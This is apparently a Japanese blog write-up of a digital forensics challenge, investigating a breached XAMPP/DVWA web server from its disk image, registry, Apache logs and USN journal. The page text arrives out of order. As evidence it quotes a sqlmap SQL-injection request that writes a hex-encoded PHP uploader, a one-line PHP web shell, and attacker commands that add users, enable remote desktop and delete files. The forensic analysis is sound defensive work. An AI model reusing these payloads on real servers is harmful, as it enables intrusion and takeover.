-0700] \"GET /tmpbiwuc.php?cmd=echo%20command%20execution%20test HTTP/1.1\" 200 36 \"-\" \"sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)\" その後はtmpbiwuc.php経由でtmpukudk.phpと自身をdelコマンドで削除している．\n2 上と大体同じ\ntmpudvfh.phpをドロップして，tmpbrjvl.phpをPython経由でアップロード，その後に削除．\nURLDecode済み\n[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/apache_logs]$ cat access.log|grep -e tmpudvfh.php -e tmpbrjvl.php 192.168.56.102 - - [02/Sep/2015:23:52:24 -0700] \"GET /dvwa/vulnerabilities/sqli/?id=2' LIMIT 0,1 INTO OUTFILE '/xampp/htdocs/tmpudvfh.php' LINES TERMINATED BY 0x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d5c5c78616d70705c5c6874646f63735c5c3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a-- -- \u0026Submit=Submit HTTP/1.1\" 200 4893 \"-\" \"sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)\" 192.168.56.102 - - [02/Sep/2015:23:52:24 -0700] \"GET /xampp/htdocs/tmpudvfh.php HTTP/1.1\" 403 1206 \"-\" \"sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)\" 192.168.56.102 - - [02/Sep/2015:23:52:24 -0700] \"GET /htdocs/tmpudvfh.php HTTP/1.1\" 404 1059 \"-\" \"sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)\" 192.168.56.102 - - [02/Sep/2015:23:52:24 -0700] \"GET /tmpudvfh.php HTTP/1.1\" 200 315 \"-\" \"sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)\" 192.168.56.102 - - [02/Sep/2015:23:52:24 -0700] \"POST /tmpudvfh.php HTTP/1.1\" 200 25 \"-\" \"Python-urllib/2.7\" 192.168.56.102 - - [02/Sep/2015:23:52:24 -0700] \"GET /tmpbrjvl.php?cmd=echo command execution test HTTP/1.1\" 200 36 \"-\" \"sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)\" 192.168.56.102 - - [02/Sep/2015:23:59:38 -0700] \"GET /tmpbrjvl.php?cmd=del /F /Q C:\\xampp\\htdocs\\tmpudvfh.php HTTP/1.1\" 200 11 \"-\" \"sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)\" 192.168.56.102 - - [02/Sep/2015:23:59:38 -0700] \"GET /tmpbrjvl.php?cmd=del /F /Q \\xampp\\htdocs\\tmpbrjvl.php HTTP/1.1\" 200 11 \"-\" \"sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)\" USNJrnlからも削除を確認することが出来る．UTCなので-7にする必要がある．\n[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/usnjrnl]$ cat usn_analytics_records-20150903T065251.csv|grep .php \"22433888\" \"1\" \"2015/09/03 06:59:38.713027\" \"0.000000\" \"tmpudvfh.php\" \"DELETE|CLOSE\" \"ARCHIVE\" \"60478\" \"42732\" \"\" \"22433976\" \"1\" \"2015/09/03 06:59:38.822402\" \"0.000000\" \"tmpbrjvl.php\" \"DELETE|CLOSE\" \"ARCHIVE\" \"62328\" \"42732\" \"\" LocalFileInclude ディレクトリトラバーサル攻撃とローカルファイルインクルード攻撃の区別が個人的についていなかったので，以下のブログを参考にさせていただきました．\nディレクトリ・トラバーサルとファイルインクルードとの違い - Web Application Security Memo\n今回はLFIで良さそう．\n/dvwa/vulnerabilities/fiのディレクトリ名的にもFileIncludeを想定していそう．\n何回も行われているが，読み込まれているファイルとしては以下のものの様子．\nC:/Windows/System32/drivers/etc/hosts DNSより参照されるIPアドレスとドメイン名の一覧などのファイル C:/users/administrator/data.txt 作成日時や内容的に攻撃者が作成したテストファイルのように見える C:/xampp/phpMyAdmin/config.inc phpMyAdminの設定ファイルっぽいが，config.inc.phpはあるがこの名前のファイルは無いので，apacheのerror.logでFile not foundのエラーが返される File not found - config.inc File not found - config.inc [Wed Sep 02 04:25:52.991836 2015] [authz_core:error] [pid 2880:tid 1564] [client 192.168.56.102:51858] AH01630: client denied by server configuration: C:/xampp/htdocs/xampp/htdocs [Wed Sep 02 23:52:24.494277 2015] [authz_core:error] [pid 2880:tid 1596] [client 192.168.56.102:51904] AH01630: client denied by server configuration: C:/xampp/htdocs/xampp/htdocs abc.txt\n? USNJrnlを見るとabcというフォルダが作成されているが関係あるのかどうか [socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/usnjrnl]$ cat usn_analytics_records-20150903T065251.csv | grep abc \"22799776\" \"2\" \"2015/09/03 07:17:58.338027\" \"0.000000\" \"abc\\\" \"CREATE|CLOSE\" \"FOLDER\" \"62335\" \"60268\" \"\" PHPのログを見る /xampp/php/php.iniで設定ファイルを確認．\nエラーログはここあるらしい．error_log=\"C:\\xampp\\php\\logs\\php_error_log\"\nログ中にEurope/Berlinとあり，timezoneが違うようなので，おそらくUTC+1したものとなる．\ninclude()する際，開くことが出来なかったファイルパスを確認することが出来る． WebShell USNJrnlを見ているとWebShellっぽいものが作成されていることを確認することが出来る． webshells.zipの中身はc99.php，webshell.phpの様子．\n[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/usnjrnl]$ cat usn_analytics_records-20150903T065251.csv|grep webshells \"22709744\" \"5\" \"2015/09/03 07:14:48.103652\" \"0.031250\" \"webshells.zip\" \"CREATE|EXTEND|OVERWRITE|INFO|CLOSE\" \"ARCHIVE\" \"62331\" \"12859\" \"\" \"22710184\" \"2\" \"2015/09/03 07:14:51.338027\" \"0.000000\" \"webshells\\\" \"CREATE|CLOSE\" \"FOLDER\" \"62332\" \"12859\" \"\" \"22710344\" \"5\" \"2015/09/03 07:14:51.384902\" \"0.000000\" \"c99.php\" \"CREATE|EXTEND|INFO|CLOSE\" \"ARCHIVE\" \"62333\" \"62332\" \"webshells\\\" \"22710744\" \"5\" \"2015/09/03 07:14:51.463027\" \"0.015625\" \"webshell.php\" \"CREATE|EXTEND|INFO|CLOSE\" \"ARCHIVE\" \"62334\" \"62332\" \"webshells\\\" \"22711184\" \"3\" \"2015/09/03 07:14:57.400527\" \"0.000000\" \"c99.php (62332 -\u003e 12859)\" \"MOVE\" \"ARCHIVE\" \"62333\" \"62332\" \"webshells\\\" \"22711424\" \"3\" \"2015/09/03 07:14:57.400527\" \"0.000000\" \"webshell.php (62332 -\u003e 12859)\" \"MOVE\" \"ARCHIVE\" \"62334\" \"62332\" \"webshells\\\" webshell.php\n\u003c?php system($_GET[\"cmd\"]); ?\u003e c99.php\nhttps://github.com/tennc/webshell/blob/master/php/PHPshell/c99/c99.php\nSHA-256 4320d95cc2fe61e0b862756f8c4ffb251c7d1391e2f6841887c3dc765ba0369c\nVirusTotalにハッシュをぶち込むと有名なc99.phpと出してくれる． https://www.virustotal.com/#/file/4320d95cc2fe61e0b862756f8c4ffb251c7d1391e2f6841887c3dc765ba0369c/detection\nc99.phpを実行した際のエラーがphp_error_logに残っているのでこの時間には実行されたというのが確認出来る．\n[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01]$ cat php_error_log | grep c99.php [03-Sep-2015 09:19:32 Europe/Berlin] PHP Parse error: syntax error, unexpected '}' in C:\\xampp\\htdocs\\DVWA\\c99.php on line 2565 他にも，/xampp/htdocs/DVWA/hackable/uploads下にphpshell.php，php2shell.phpが設置されている． access.logを見ると，abcディレクトリを作成するコマンドを受け付けていたのはphpshell.phpだということが判明． php_error_logにもphpshell.phpの痕跡が残っている．\n[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01]$ cat php_error_log | grep phpshell.php [03-Sep-2015 09:15:58 Europe/Berlin] PHP Notice: Undefined index: cmd in C:\\xampp\\htdocs\\DVWA\\hackable\\uploads\\phpshell.php on line 2 [03-Sep-2015 09:15:58 Europe/Berlin] PHP Warning: system(): Cannot execute a blank command in C:\\xampp\\htdocs\\DVWA\\hackable\\uploads\\phpshell.php on line 2 [03-Sep-2015 09:16:03 Europe/Berlin] PHP Notice: Undefined index: cmd in C:\\xampp\\htdocs\\DVWA\\hackable\\uploads\\phpshell.php on line 2 [03-Sep-2015 09:16:03 Europe/Berlin] PHP Warning: system(): Cannot execute a blank command in C:\\xampp\\htdocs\\DVWA\\hackable\\uploads\\phpshell.php on line 2 [03-Sep-2015 09:18:58 Europe/Berlin] PHP Notice: Undefined index: cmd in C:\\xampp\\htdocs\\DVWA\\hackable\\uploads\\phpshell.php on line 2 [03-Sep-2015 09:18:58 Europe/Berlin] PHP Warning: system(): Cannot execute a blank command in C:\\xampp\\htdocs\\DVWA\\hackable\\uploads\\phpshell.php on line 2 TimeLine 正直，UTCとかがごちゃごちゃで間違っている気さえする．\nWeb Server Caseということもあり，apache logをかなり見てしまった．良いのか．\n日時(UTC) 事象 ソース 備考 2015/09/02 08:52:29 /dvwa/vulnerabilities/exec/へのHTTP通信開始 apache access.log UAと時間的にこのくらいの時間 2015/09/02 ??:??:?? コマンド実行net user user1 user1 /add(user1作成) メモリダンプ(console)　/dvwa/vulnerabilities/exec/でのOSコマンドインジェクション? 2015/09/02 09:05:06 user1アカウントの作成 SAM 2015/09/02 ??:??:?? コマンド実行net localgroup “Remote Desktop Users” user1 /add(user1のRDPローカルグループの追加) メモリダンプ(console)　/dvwa/vulnerabilities/exec/でのOSコマンドインジェクション? 2015/09/02 ??:??:?? コマンド実行netsh firewall set service type = remotedesktop enable(RDPの有効) メモリダンプ(console)　/dvwa/vulnerabilities/exec/でのOSコマンドインジェクション? 2015/09/02 09:05:?? コマンド実行net user hacker hacker /add(hacker作成) メモリダンプ(strings)　/dvwa/vulnerabilities/exec/でのOSコマンドインジェクション? 2015/09/02 09:05:25 hackerアカウントの作成 SAM 2015/09/02 09:05:?? コマンド実行net localgroup “Remote Desktop Users” hacker /add(hacker作成) メモリダンプ(strings)　/dvwa/vulnerabilities/exec/でのOSコマンドインジェクション? 2015/09/02 09:31:16 /windows/system32/drivers/etc/hostsの読み込み apache access.log　LFI 2015/09/02 09:33:23 /users/administrator/data.txtの読み込み apache access.log　LFI 2015/09/02 09:34:52 /xampp/phpmyadmin/config.incの読み込み apache access.log, error.log　LFI config.incはないconfig.inc.phpは現存する 2015/09/02 11:15:40 sqlmapでの攻撃開始 apache access.log 2015/09/02 11:25:52 /xampp/htdocs/tmpukudk.phpの作成 apache access.log SQLinjection 2015/09/02 11:26:04 tmpbiwuc.phpの作成 apache_access.log Python-urllib経由の様子 2015/09/02 11:26:04 tmpbiwuc.phpでコマンド実行dir apache access.log 2015/09/02 11:26:04 tmpbiwuc.phpでコマンド実行del /F /Q C:\\xampp\\htdocs\tmpukudk.php(tmpukudk.phpの削除) apache access.log 2015/09/02 11:26:23 tmpbiwuc.phpでコマンド実行del /F /Q \\xampp\\htdocs\\tmpbiwuc.php(tmpbiwuc.phpの削除) apache access.log 2015/09/03 06:52:24 /xampp/htdocs/tmpudvfh.phpの作成 apache_access.log SQLinjection 2015/09/03 06:52:2? tmpbrjvl.phpの作成 apache_access.log Python-urllib経由の様子 2015/09/03 06:52:24 tmpbrjvl.phpでコマンド実行echo command execution test(テストコマンド) apache_access.log 2015/09/03 06:59:38 tmpbrjvl.phpでコマンド実行cmd=del /F /Q C:\\xampp\\htdocs\\tmpudvfh.php(tmpudvfh.php削除) apache_access.log, UsnJrnl 2015/09/03 06:59:38 tmpbrjvl.phpでコマンド実行cmd=del /F /Q C:\\xampp\\htdocs\\tmpbrjvl.php(tmpbrjvl.php削除) apache_access.log, UsnJrnl 2015/09/03 07:14:48 webshells.zipの作成 UsnJrnl 2015/09/03 07:16:13 phpshell.phpでコマンド実行dir apache access.log 2015/09/03 07:17:49 phpshell.phpでコマンド実行dir c:\\ apache access.log 2015/09/03 07:17:58 phpshell.phpでコマンド実行mkdir abc apache access.log これいる？ 2015/09/03 07:18:02 phpshell.phpでコマンド実行dir apache access.log 2015/09/03 07:21:37 c99でcmd実行 apache access.log c99.php?act=cmdのリクエストが発生 ","wordCount":"2216","inLanguage":"en","datePublished":"2018-02-05T03:21:46Z","dateModified":"2018-02-05T03:21:46Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://socketo.github.io/posts/2018/02/05/"},"publisher":{"@type":"Organization","name":"socketo.github.io","logo":{"@type":"ImageObject","url":"https://socketo.github.io/images/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://socketo.github.io/ accesskey=h title="socketo.github.io (Alt + H)">socketo.github.io</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://socketo.github.io/archives title=archives><span><i class='fa fa-heart'></i>archives</span></a></li><li><a href=https://socketo.github.io/tags title=tags><span><i class='fa fa-heart'></i>tags</span></a></li><li><a href=https://socketo.github.io/about title=about><span><i class='fa fa-heart'></i>about</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Digital Forensic Challenge #1 - Web Server Case Write up</h1><div class=post-meta><span title='2018-02-05 03:21:46 +0000 UTC'>February 5, 2018</span>&nbsp;·&nbsp;11 min</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#%e5%95%8f%e9%a1%8c%e6%96%87 aria-label=問題文>問題文</a></li><li><a href=#%e8%aa%bf%e6%9f%bb%e7%92%b0%e5%a2%83%e3%83%84%e3%83%bc%e3%83%ab aria-label=調査環境・ツール>調査環境・ツール</a></li><li><a href=#%e8%aa%bf%e6%9f%bb aria-label=調査>調査</a><ul><li><a href=#%e5%9f%ba%e6%9c%ac%e6%83%85%e5%a0%b1%e3%82%92%e8%aa%bf%e3%81%b9%e3%82%8b aria-label=基本情報を調べる>基本情報を調べる</a></li><li><a href=#usn%e3%82%b8%e3%83%a3%e3%83%bc%e3%83%8a%e3%83%ab%e3%81%ae%e8%a7%a3%e6%9e%90 aria-label=USNジャーナルの解析>USNジャーナルの解析</a></li><li><a href=#%e8%aa%bf%e6%9f%bb-1 aria-label=調査>調査</a><ul><li><a href=#%e3%83%a1%e3%83%a2%e3%83%aa%e3%83%80%e3%83%b3%e3%83%97%e3%81%8b%e3%82%89%e8%aa%bf%e3%81%b9%e3%82%8b aria-label=メモリダンプから調べる>メモリダンプから調べる</a></li></ul></li><li><a href=#apache-log%e3%81%ae%e7%a2%ba%e8%aa%8d aria-label="Apache logの確認">Apache logの確認</a><ul><li><a href=#dvwa aria-label=/dvwa/>/dvwa/</a></li></ul></li><li><a href=#%e6%94%bb%e6%92%83%e8%80%85%e3%81%ae%e3%83%a6%e3%83%bc%e3%82%b6%e4%bd%9c%e6%88%90 aria-label=攻撃者のユーザ作成>攻撃者のユーザ作成</a><ul><li><a href=#%e3%83%a1%e3%83%a2%e3%83%aa%e3%82%a4%e3%83%a1%e3%83%bc%e3%82%b8%e3%81%8b%e3%82%89strings%e3%81%a7%e8%a6%8b%e3%82%8b aria-label=メモリイメージからStringsで見る>メモリイメージからStringsで見る</a></li></ul></li><li><a href=#sqlinjection aria-label=SQLinjection>SQLinjection</a><ul><li><a href=#tmpukudkphp%e3%81%a8tmpbiwucphp aria-label=tmpukudk.phpとtmpbiwuc.php>tmpukudk.phpとtmpbiwuc.php</a></li><li><a href=#2 aria-label=2>2</a></li></ul></li><li><a href=#localfileinclude aria-label=LocalFileInclude>LocalFileInclude</a><ul><li><a href=#php%e3%81%ae%e3%83%ad%e3%82%b0%e3%82%92%e8%a6%8b%e3%82%8b aria-label=PHPのログを見る>PHPのログを見る</a></li></ul></li><li><a href=#webshell aria-label=WebShell>WebShell</a></li><li><a href=#timeline aria-label=TimeLine>TimeLine</a></li></ul></li></ul></div></details></div><div class=post-content><p>※ 移行前の元ブログ記事 : <a href=https://socketo.hatenablog.jp/entry/2018/02/05/032146>Digital Forensic Challenge #1 - Web Server Case Write up - #include &lt;sys_socket.h></a></p><p>本投稿の内容に間違いや問題などありましたら，Twitter経由などでやんわり優しめに教えて頂ければ幸いです．(Twitter:<a href=https://twitter.com/sys_socket>@sys_socket</a>)</p><p>はい．</p><p><a href=https://www.ashemery.com/dfir.html>https://www.ashemery.com/dfir.html</a> のChallenge #1</p><p>参考:</p><p><a href=https://betweentwodfirns.blogspot.jp/2017/03/ashemerycom-challenge-1-web-server-case.html>Between Two DFIRns: Ashemery.com: Challenge #1 - Web Server Case Write-up</a></p><h2 id=問題文>問題文<a hidden class=anchor aria-hidden=true href=#問題文>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>A company’s web server has been breached through their website. Our team arrived just in time to take a forensic image of the running system and its memory for further analysis. The files can be found below:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>1. System Image
</span></span><span style=display:flex><span>2. System Memory
</span></span><span style=display:flex><span>3. Hashes:
</span></span><span style=display:flex><span>4. Passwords
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>To successfully solve this challenge, a report with answers to the tasks below is required:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>1.  What type of attacks has been performed on the box?
</span></span><span style=display:flex><span>2.  How many users has the attacker(s) added to the box, and how were they added?
</span></span><span style=display:flex><span>3.  What leftovers (files, tools, info, etc) did the attacker(s) leave behind? (assume our team arrived in time and the attacker(s) couldn’t clean and cover their tracks)
</span></span><span style=display:flex><span>4.  What software has been installed on the box, and were they installed by the attacker(s) or not?
</span></span><span style=display:flex><span>5.  Using memory forensics, can you identify the type of shellcode used?
</span></span><span style=display:flex><span>6.  What is the timeline analysis for all events that happened on the box?
</span></span><span style=display:flex><span>7.  What is your hypothesis for the case, and what is your approach in solving it?
</span></span><span style=display:flex><span>8.  Is there anything else you would like to add?
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>**Bonus Question:** what are the directories and files, that have been added by the attacker(s)? List all with proof.
</span></span><span style=display:flex><span>**Important Note:** do not use commercial tools for your own learning benefit.
</span></span></code></pre></div><p>稼働していたWebサービスのシステムディスクのイメージと，システムのメモリから侵害の様子を調査する．</p><p>調査する際に以下の項目を答えなけらばならない．</p><ol><li>どのような攻撃が行われたか？</li><li>追加された攻撃者のユーザ数と，そのユーザがどのように追加されたのか？</li><li>攻撃者が残したファイル，ツール，情報</li><li>攻撃者によってインストールされたソフトウェア</li><li>メモリダンプから使用したシェルコードの種類の特定</li><li>発生したインシデントのタイムライン</li><li>このインシデントの仮説とそのアプローチ</li><li>その他追加</li></ol><h2 id=調査環境ツール>調査環境・ツール<a hidden class=anchor aria-hidden=true href=#調査環境ツール>#</a></h2><ul><li><p>FTK(R) Imager 3.2.0 : <a href=http://marketing.accessdata.com/ftkimager3.2.0>http://marketing.accessdata.com/ftkimager3.2.0</a></p></li><li><p>SIFT CLI : <a href=https://github.com/sans-dfir/sift-cli>https://github.com/sans-dfir/sift-cli</a></p><ul><li>RegRIpper : <a href=https://github.com/keydet89/RegRipper2.8>https://github.com/keydet89/RegRipper2.8</a></li><li>Volatility : <a href=https://github.com/volatilityfoundation/volatility>https://github.com/volatilityfoundation/volatility</a></li></ul></li><li><p>USNAnalytics : <a href=https://www.kazamiya.net/usn_analytics>https://www.kazamiya.net/usn_analytics</a></p></li></ul><p>有償のツールを使うなということなので，X-waysやEnCaseやその他便利有償ツールとかは使わなんという感じで．</p><p>とりあえずダウンロードしたSystem ImageをFTK Imagerにマウントする．
<img loading=lazy src=https://i.imgur.com/vONMwUB.png></p><p>出来そうなのでやる．</p><h2 id=調査>調査<a hidden class=anchor aria-hidden=true href=#調査>#</a></h2><h3 id=基本情報を調べる>基本情報を調べる<a hidden class=anchor aria-hidden=true href=#基本情報を調べる>#</a></h3><p>regripperを使用．使い方などはここに記載してあるので参考に．</p><p><a href=http://resources.infosecinstitute.com/registry-forensics-regripper-command-line-linux/>Windows Registry Forensics using ‘RegRipper’ Command-Line on Linux</a></p><p>主要なレジストリハイブファイルは<code>%SYSTEMROOT%/System32/config/</code>にあるので<code>SAM</code>,<code>SECURITY</code>,<code>SOFTWARE</code>,<code>SYSTEM</code>をFTKImagerでExportする</p><p>各レジストリの説明などはここ
<a href=https://support.microsoft.com/ja-jp/help/256986/windows-registry-information-for-advanced-users>https://support.microsoft.com/ja-jp/help/256986/windows-registry-information-for-advanced-users</a></p><ul><li>OS情報
Windowsのバージョンを確認</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/reg]$ rip.pl -r SOFTWARE -p winver
</span></span><span style=display:flex><span>Launching winver v.20081210
</span></span><span style=display:flex><span>winver v.20081210
</span></span><span style=display:flex><span>(Software) Get Windows version
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ProductName = Windows Server (R) 2008 Standard
</span></span><span style=display:flex><span>CSDVersion  = Service Pack 1
</span></span><span style=display:flex><span>InstallDate = Mon Aug 24 06:52:43 2015
</span></span></code></pre></div><p>WindowsServer(R)2008 standard SP1と判明</p><ul><li>timezone
timezoneの確認</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/reg]$ rip.pl -r SYSTEM -p timezone
</span></span><span style=display:flex><span>Launching timezone v.20160318
</span></span><span style=display:flex><span>timezone v.20160318
</span></span><span style=display:flex><span>(System) Get TimeZoneInformation key contents
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>TimeZoneInformation key
</span></span><span style=display:flex><span>ControlSet001\Control\TimeZoneInformation
</span></span><span style=display:flex><span>LastWrite Time Mon Aug 24 07:50:29 2015 (UTC)
</span></span><span style=display:flex><span>DaylightName   -&gt; @tzres.dll,-211
</span></span><span style=display:flex><span>StandardName   -&gt; @tzres.dll,-212
</span></span><span style=display:flex><span>Bias           -&gt; 480 (8 hours)
</span></span><span style=display:flex><span>ActiveTimeBias -&gt; 420 (7 hours)
</span></span><span style=display:flex><span>TimeZoneKeyName-&gt; Pacific Standard Time
</span></span></code></pre></div><p>タイムゾーンがPacific Standard TimeでUTC -8というのを確認</p><ul><li>ComputerName/Hostname
コンピュータ名とホスト名を確認</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/reg]$ rip.pl -r SYSTEM -p compname
</span></span><span style=display:flex><span>Launching compname v.20090727
</span></span><span style=display:flex><span>compname v.20090727
</span></span><span style=display:flex><span>(System) Gets ComputerName and Hostname values from System hive
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ComputerName    = WIN-L0ZZQ76PMUF
</span></span><span style=display:flex><span>TCP/IP Hostname = WIN-L0ZZQ76PMUF
</span></span></code></pre></div><ul><li>User確認</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/reg]$ rip.pl -r SAM -p samparse
</span></span><span style=display:flex><span>Launching samparse v.20160203
</span></span><span style=display:flex><span>samparse v.20160203
</span></span><span style=display:flex><span>(SAM) Parse SAM file for user &amp; group mbrshp info
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>User Information
</span></span><span style=display:flex><span>-------------------------
</span></span><span style=display:flex><span>Username        : Administrator [500]
</span></span><span style=display:flex><span>Full Name       :
</span></span><span style=display:flex><span>User Comment    : Built-in account for administering the computer/domain
</span></span><span style=display:flex><span>Account Type    : Default Admin User
</span></span><span style=display:flex><span>Account Created : Mon Aug 24 06:54:25 2015 Z
</span></span><span style=display:flex><span>Name            :
</span></span><span style=display:flex><span>Last Login Date : Sat Sep 12 18:19:18 2015 Z
</span></span><span style=display:flex><span>Pwd Reset Date  : Mon Aug 24 06:59:37 2015 Z
</span></span><span style=display:flex><span>Pwd Fail Date   : Wed Sep  2 09:00:39 2015 Z
</span></span><span style=display:flex><span>Login Count     : 23
</span></span><span style=display:flex><span>--&gt; Normal user account
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Username        : Guest [501]
</span></span><span style=display:flex><span>Full Name       :
</span></span><span style=display:flex><span>User Comment    : Built-in account for guest access to the computer/domain
</span></span><span style=display:flex><span>Account Type    : Default Guest Acct
</span></span><span style=display:flex><span>Account Created : Mon Aug 24 06:54:25 2015 Z
</span></span><span style=display:flex><span>Name            :
</span></span><span style=display:flex><span>Last Login Date : Never
</span></span><span style=display:flex><span>Pwd Reset Date  : Never
</span></span><span style=display:flex><span>Pwd Fail Date   : Never
</span></span><span style=display:flex><span>Login Count     : 0
</span></span><span style=display:flex><span>--&gt; Password does not expire
</span></span><span style=display:flex><span>--&gt; Account Disabled
</span></span><span style=display:flex><span>--&gt; Password not required
</span></span><span style=display:flex><span>--&gt; Normal user account
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Username        : user1 [1005]
</span></span><span style=display:flex><span>Full Name       :
</span></span><span style=display:flex><span>User Comment    :
</span></span><span style=display:flex><span>Account Type    : Custom Limited Acct
</span></span><span style=display:flex><span>Account Created : Wed Sep  2 09:05:06 2015 Z
</span></span><span style=display:flex><span>Name            :
</span></span><span style=display:flex><span>Last Login Date : Never
</span></span><span style=display:flex><span>Pwd Reset Date  : Wed Sep  2 09:05:06 2015 Z
</span></span><span style=display:flex><span>Pwd Fail Date   : Never
</span></span><span style=display:flex><span>Login Count     : 0
</span></span><span style=display:flex><span>--&gt; Normal user account
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Username        : hacker [1006]
</span></span><span style=display:flex><span>Full Name       :
</span></span><span style=display:flex><span>User Comment    :
</span></span><span style=display:flex><span>Account Type    : Custom Limited Acct
</span></span><span style=display:flex><span>Account Created : Wed Sep  2 09:05:25 2015 Z
</span></span><span style=display:flex><span>Name            :
</span></span><span style=display:flex><span>Last Login Date : Never
</span></span><span style=display:flex><span>Pwd Reset Date  : Wed Sep  2 09:05:25 2015 Z
</span></span><span style=display:flex><span>Pwd Fail Date   : Never
</span></span><span style=display:flex><span>Login Count     : 0
</span></span><span style=display:flex><span>--&gt; Normal user account
